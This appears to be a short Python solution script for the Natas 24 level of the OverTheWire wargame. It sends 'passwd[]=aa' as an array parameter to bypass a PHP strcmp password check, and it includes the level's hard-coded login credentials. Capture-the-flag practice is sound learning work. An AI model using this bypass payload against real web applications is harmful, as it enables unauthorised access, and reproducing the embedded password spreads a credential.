import requests

URL = "http://natas24.natas.labs.overthewire.org/?passwd[]=aa"
CREDS = ("natas24", "OsRmXFguozKpTZZ5X14zNO43379LZveg")

print(requests.get(URL, auth=CREDS).text)
